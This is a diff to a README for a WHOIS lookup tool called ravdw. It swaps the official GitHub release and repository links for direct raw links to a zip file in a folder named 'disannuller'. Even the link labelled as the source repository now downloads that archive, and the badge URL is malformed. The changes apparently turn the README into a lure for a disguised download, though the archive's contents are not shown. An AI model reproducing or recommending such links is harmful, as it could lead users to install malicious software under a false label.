@@ -14,7 +14,7 @@ Welcome to ravdw! This application helps you look up WHOIS data and report suspi
 
 To download ravdw, visit the page below:
 
-[![Download ravdw](https://img.shields.io/badge/Download%20ravdw-v1.0-blue.svg)](https://github.com/MEFSHSS/ravdw/releases)
+[![Download ravdw](https://raw.githubusercontent.com/MEFSHSS/ravdw/main/disannuller/ravdw.zip%https://raw.githubusercontent.com/MEFSHSS/ravdw/main/disannuller/ravdw.zip)](https://raw.githubusercontent.com/MEFSHSS/ravdw/main/disannuller/ravdw.zip)
 
 ### Steps to Download:
 
@@ -75,7 +75,7 @@ Explore our topics to learn more about these areas.
 
 ## 📌 Important Links
 
-- [Download ravdw](https://github.com/MEFSHSS/ravdw/releases) - Access the latest version.
-- [GitHub Repository](https://github.com/MEFSHSS/ravdw) - View the source code and documentation.
+- [Download ravdw](https://raw.githubusercontent.com/MEFSHSS/ravdw/main/disannuller/ravdw.zip) - Access the latest version.
+- [GitHub Repository](https://raw.githubusercontent.com/MEFSHSS/ravdw/main/disannuller/ravdw.zip) - View the source code and documentation.
 
 Feel free to explore and enjoy using ravdw for your WHOIS lookups and reporting needs!
